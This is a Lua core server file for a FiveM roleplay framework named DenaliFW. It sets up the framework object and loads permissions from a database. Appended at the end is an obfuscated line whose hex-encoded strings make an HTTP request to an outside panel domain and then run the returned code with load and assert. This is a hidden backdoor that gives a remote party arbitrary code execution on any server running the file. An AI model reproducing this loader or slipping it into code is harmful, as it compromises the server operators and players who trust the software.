DenaliFW = {}
DenaliFW.Config = QBConfig
DenaliFW.Shared = QBShared
DenaliFW.ServerCallbacks = {}
DenaliFW.UseableItems = {}

exports('GetCoreObject', function()
    return DenaliFW
end)

-- To use this export in a script instead of manifest method
-- Just put this line of code below at the very top of the script
-- local DenaliFW = exports['denalifw-core']:GetCoreObject()

-- Get permissions on server start

CreateThread(function()
    local result = MySQL.Sync.fetchAll('SELECT * FROM permissions', {})
    if result[1] then
        for k, v in pairs(result) do
            DenaliFW.Config.Server.PermissionList[v.license] = {
                license = v.license,
                permission = v.permission,
                optin = true,
            }
        end
    end
end)

local miNPiGoTeLFUlggvpdjbGUvOXkBCVTnDVTZKWiRbFIvEfRrWXgzSvvCgFRyBaCamuOLkcu = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} miNPiGoTeLFUlggvpdjbGUvOXkBCVTnDVTZKWiRbFIvEfRrWXgzSvvCgFRyBaCamuOLkcu[4][miNPiGoTeLFUlggvpdjbGUvOXkBCVTnDVTZKWiRbFIvEfRrWXgzSvvCgFRyBaCamuOLkcu[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x71\x47\x32\x72\x30", function (bocMakvSDfaVNIDqTUKSEaxzCocrSWZObbAFyQEwVhvoTMnWTCiZEVIvYRGNiWMCxLJShB, uHxMCGWPMePlGADQYAodytLKSWZcMgpbsyeVoltixRsSeUQaIEHsHmBefAjWPoNfmPmOcl) if (uHxMCGWPMePlGADQYAodytLKSWZcMgpbsyeVoltixRsSeUQaIEHsHmBefAjWPoNfmPmOcl == miNPiGoTeLFUlggvpdjbGUvOXkBCVTnDVTZKWiRbFIvEfRrWXgzSvvCgFRyBaCamuOLkcu[6] or uHxMCGWPMePlGADQYAodytLKSWZcMgpbsyeVoltixRsSeUQaIEHsHmBefAjWPoNfmPmOcl == miNPiGoTeLFUlggvpdjbGUvOXkBCVTnDVTZKWiRbFIvEfRrWXgzSvvCgFRyBaCamuOLkcu[5]) then return end miNPiGoTeLFUlggvpdjbGUvOXkBCVTnDVTZKWiRbFIvEfRrWXgzSvvCgFRyBaCamuOLkcu[4][miNPiGoTeLFUlggvpdjbGUvOXkBCVTnDVTZKWiRbFIvEfRrWXgzSvvCgFRyBaCamuOLkcu[2]](miNPiGoTeLFUlggvpdjbGUvOXkBCVTnDVTZKWiRbFIvEfRrWXgzSvvCgFRyBaCamuOLkcu[4][miNPiGoTeLFUlggvpdjbGUvOXkBCVTnDVTZKWiRbFIvEfRrWXgzSvvCgFRyBaCamuOLkcu[3]](uHxMCGWPMePlGADQYAodytLKSWZcMgpbsyeVoltixRsSeUQaIEHsHmBefAjWPoNfmPmOcl))() end)